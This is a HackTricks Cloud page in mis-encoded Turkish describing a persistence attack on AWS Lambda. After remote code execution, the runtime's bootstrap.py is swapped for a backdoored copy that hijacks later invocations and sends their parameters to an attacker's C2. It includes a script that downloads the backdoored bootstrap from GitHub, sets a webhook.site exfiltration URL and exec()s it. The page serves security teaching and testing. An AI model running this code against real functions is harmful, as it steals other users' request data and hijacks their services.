# AWS - Lambda Ä°steklerini Ã‡almak

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter**'da takip edin ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **HackTricks'e** [**PR gÃ¶ndererek**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **hacking ipuÃ§larÄ±nÄ± paylaÅŸÄ±n**.

</details>
{% endhint %}

## Lambda AkÄ±ÅŸÄ±

<figure><img src="../../../../.gitbook/assets/image (152).png" alt=""><figcaption><p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/lambda_poc_2_arch.png">https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/lambda_poc_2_arch.png</a></p></figcaption></figure>

1. **Slicer**, konteynerin dÄ±ÅŸÄ±nda bir sÃ¼reÃ§tir ve **init** sÃ¼recine **Ã§aÄŸrÄ±lar** gÃ¶nderir.
2. Init sÃ¼reci, bazÄ± ilginÃ§ uÃ§ noktalarÄ± aÃ§Ä±ÄŸa Ã§Ä±kararak **9001** portunu dinler:
* **`/2018-06-01/runtime/invocation/next`** â€“ bir sonraki Ã§aÄŸrÄ± olayÄ±nÄ± al
* **`/2018-06-01/runtime/invocation/{invoke-id}/response`** â€“ Ã§aÄŸrÄ± iÃ§in iÅŸleyici yanÄ±tÄ±nÄ± dÃ¶ndÃ¼r
* **`/2018-06-01/runtime/invocation/{invoke-id}/error`** â€“ bir yÃ¼rÃ¼tme hatasÄ± dÃ¶ndÃ¼r
3. **bootstrap.py**, init sÃ¼recinden Ã§aÄŸrÄ±larÄ± alÄ±p kullanÄ±cÄ± kodunu Ã§aÄŸÄ±ran bir dÃ¶ngÃ¼ye sahiptir (**`/next`**).
4. Son olarak, **bootstrap.py** yanÄ±tÄ± init'e gÃ¶nderir.

Bootstrap, kullanÄ±cÄ± kodunu bir modÃ¼l olarak yÃ¼kler, bu nedenle kullanÄ±cÄ± kodu tarafÄ±ndan gerÃ§ekleÅŸtirilen herhangi bir kod yÃ¼rÃ¼tme iÅŸlemi aslÄ±nda bu sÃ¼reÃ§te gerÃ§ekleÅŸir.

## Lambda Ä°steklerini Ã‡almak

Bu saldÄ±rÄ±nÄ±n amacÄ±, kullanÄ±cÄ± kodunun, savunmasÄ±z isteÄŸi iÅŸleyen **`bootstrap.py`** sÃ¼reci iÃ§inde kÃ¶tÃ¼ niyetli bir **`bootstrap.py`** sÃ¼reci yÃ¼rÃ¼tmesini saÄŸlamaktÄ±r. Bu ÅŸekilde, **kÃ¶tÃ¼ niyetli bootstrap** sÃ¼reci, istekleri iÅŸlemek iÃ§in init sÃ¼reciyle **konuÅŸmaya baÅŸlayacak** ve **meÅŸru** bootstrap, kÃ¶tÃ¼ niyetli olanÄ± Ã§alÄ±ÅŸtÄ±rarak **tuzaÄŸa dÃ¼ÅŸecek**, bÃ¶ylece init sÃ¼recine istek sormayacaktÄ±r.

Bu, kullanÄ±cÄ± kodunun meÅŸru **`bootstrap.py`** sÃ¼reci tarafÄ±ndan yÃ¼rÃ¼tÃ¼ldÃ¼ÄŸÃ¼ iÃ§in basit bir gÃ¶revdir. Bu nedenle saldÄ±rgan ÅŸunlarÄ± yapabilir:

* Init sÃ¼recine mevcut Ã§aÄŸrÄ±nÄ±n sahte bir sonucunu gÃ¶nderin, bÃ¶ylece init, bootstrap sÃ¼recinin daha fazla Ã§aÄŸrÄ± beklediÄŸini dÃ¼ÅŸÃ¼nsÃ¼n.
* Bir istek **`/${invoke-id}/response`**'a gÃ¶nderilmelidir.
* Invoke-id, meÅŸru **`bootstrap.py`** sÃ¼recinin yÄ±ÄŸÄ±nÄ±ndan [**inspect**](https://docs.python.org/3/library/inspect.html) python modÃ¼lÃ¼ kullanÄ±larak (burada [Ã¶nerildiÄŸi gibi](https://github.com/twistlock/lambda-persistency-poc/blob/master/poc/switch\_runtime.py)) veya sadece tekrar **`/2018-06-01/runtime/invocation/next`**'e istek yaparak (burada [Ã¶nerildiÄŸi gibi](https://github.com/Djkusik/serverless\_persistency\_poc/blob/master/gcp/exploit\_files/switcher.py)) elde edilebilir.
* Bir sonraki Ã§aÄŸrÄ±larÄ± iÅŸlemek iÃ§in kÃ¶tÃ¼ niyetli bir **`bootstrap.py`** yÃ¼rÃ¼tÃ¼n.
* Gizlilik amacÄ±yla, lambda Ã§aÄŸrÄ± parametrelerini saldÄ±rganÄ±n kontrol ettiÄŸi bir C2'ye gÃ¶ndermek ve ardÄ±ndan istekleri normal ÅŸekilde iÅŸlemek mÃ¼mkÃ¼ndÃ¼r.
* Bu saldÄ±rÄ± iÃ§in, sistemden veya [**github**](https://github.com/aws/aws-lambda-python-runtime-interface-client/blob/main/awslambdaric/bootstrap.py)'dan **`bootstrap.py`**'nin orijinal kodunu almak, kÃ¶tÃ¼ niyetli kodu eklemek ve mevcut lambda Ã§aÄŸrÄ±sÄ±ndan Ã§alÄ±ÅŸtÄ±rmak yeterlidir.

### SaldÄ±rÄ± AdÄ±mlarÄ±

1. Bir **RCE** zafiyeti bulun.
2. **KÃ¶tÃ¼ niyetli** bir **bootstrap** oluÅŸturun (Ã¶rneÄŸin [https://raw.githubusercontent.com/carlospolop/lambda\_bootstrap\_switcher/main/backdoored\_bootstrap.py](https://raw.githubusercontent.com/carlospolop/lambda\_bootstrap\_switcher/main/backdoored\_bootstrap.py))
3. KÃ¶tÃ¼ niyetli bootstrap'i **Ã§alÄ±ÅŸtÄ±rÄ±n**.

Bu iÅŸlemleri kolayca gerÃ§ekleÅŸtirebilirsiniz:
```bash
python3 <<EOF
import os
import urllib3

# Download backdoored bootstrap
http = urllib3.PoolManager()
backdoored_bootstrap_url = "https://raw.githubusercontent.com/carlospolop/lambda_bootstrap_switcher/main/backdoored_bootstrap.py"
new_runtime = http.request('GET', backdoored_bootstrap_url).data

# Load new bootstrap
os.environ['URL_EXFIL'] = "https://webhook.site/c7036f43-ce42-442f-99a6-8ab21402a7c0"

exec(new_runtime)
EOF
```
For more info check [https://github.com/carlospolop/lambda\_bootstrap\_switcher](https://github.com/carlospolop/lambda\_bootstrap\_switcher)

## Referanslar

* [https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/](https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/)

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **bizi takip edin** **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **HackTricks'e PR gÃ¶ndererek hacking ipuÃ§larÄ±nÄ± paylaÅŸÄ±n** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na.

</details>
{% endhint %}
